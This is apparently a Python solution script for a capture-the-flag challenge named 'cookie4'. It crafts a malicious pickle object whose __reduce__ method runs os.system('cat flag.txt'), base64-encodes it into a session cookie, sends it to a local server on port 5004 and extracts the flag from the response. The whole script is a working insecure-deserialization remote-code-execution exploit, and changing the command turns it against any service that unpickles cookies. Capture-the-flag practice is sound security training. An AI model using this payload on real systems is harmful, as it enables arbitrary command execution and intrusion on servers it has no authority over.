import pickle
import base64
import requests
import os
import re

class RCE:
    def __reduce__(self):
        # Command to be executed on the server
        cmd = 'cat flag.txt'
        return (os.system, (cmd,))

# Create an instance of our RCE class
pickled = pickle.dumps(RCE())

# Base64 encode the pickled object
encoded_pickle = base64.b64encode(pickled).decode('utf-8')

import time

# Give the server a moment to start
time.sleep(5)

# The URL of the challenge
url = 'http://localhost:5004' # Change port if necessary

# Set the malicious cookie
cookies = {'session': encoded_pickle}

# Send the request
try:
    response = requests.get(url, cookies=cookies)

    # Print the server's response
    print("Full response from server:")
    print(response.text)

    # Try to extract the flag
    match = re.search(r'CTF{.*}', response.text)
    if match:
        print(f"\nSuccessfully extracted flag: {match.group(0)}")
    else:
        print("\nCould not find flag in the response.")

except requests.exceptions.ConnectionError as e:
    print(f"\nError connecting to the server: {e}")
    print("Please make sure the cookie4 challenge is running.")

